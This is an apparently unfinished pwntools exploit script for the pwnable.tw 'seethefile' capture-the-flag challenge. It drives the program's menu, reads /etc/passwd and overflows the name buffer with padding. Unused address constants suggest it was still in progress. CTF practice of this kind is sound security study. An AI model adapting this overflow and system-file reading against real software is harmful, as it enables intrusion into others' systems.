#pwnable.tw
#seethefile

from pwn import *

debug = True

def menu(choice):
	s.recvuntil('Your choice :')
	s.sendline(str(choice))
	if debug:
		pass
		#print('menu', choice)

def openfile(filename):
	menu(1)
	s.recvuntil('What do you want to see :')
	s.sendline(filename)
	if debug:
		print('openfile finished')

def readfile():
	menu(2)
	if debug:
		print('readfile finished')

def writefile():
	menu(3)
	menuline = '---------------MENU---------------'
	re = s.recvuntil(menuline)
	if debug:
		print('writefile finished')
	return re[:-len(menuline)]

def closefile():
	menu(4)
	if debug:
		print('closefile finished')

def etc(name, menu_choice=5):
	menu(menu_choice)
	s.recvuntil('Leave your name :')
	s.sendline(name)
	if debug:
		print('etc finished')

def exploit():
	atoi_plt = 0x080485D0
	strstr_got = 0x0804B00C

	openfile('/etc/passwd')

	stack_buf = '5...'

	payload = 'a' * 0x20

	etc(payload, stack_buf)

	openfile('/etc/passwd')
	readfile()
	print writefile()

if debug:
    s = process('./seethefile')
    pause()
else:
    s = remote('chall.pwnable.tw', 10200)

exploit()
s.interactive()
s.close()
